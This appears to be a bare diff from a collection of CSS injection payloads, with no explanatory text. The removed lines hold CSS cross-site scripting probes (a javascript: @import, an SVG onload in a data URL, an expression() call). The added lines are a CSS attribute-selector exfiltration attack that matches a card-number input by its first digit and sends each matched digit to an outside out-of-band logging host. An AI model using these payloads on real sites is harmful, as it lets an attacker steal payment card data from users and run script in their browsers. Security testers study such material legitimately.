@@ -1,10 +1,10 @@
-@import url("javascript:alert(document.domain)");
-div {
-  background-image: url("data:text/html,<svg onload=alert(document.domain)>");
+input[name="cardno"][value^="1"] {
+    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=1);
 }
-div {
-  background-image: url("javascript:/*\nalert(document.domain)");
+input[name="cardno"][value^="2"] {
+    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=2);
 }
-    div {
-  width: expression(alert(document.domain));
+input[name="cardno"][value^="3"] {
+    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=3);
 }
+/* And so on for each possible value... */
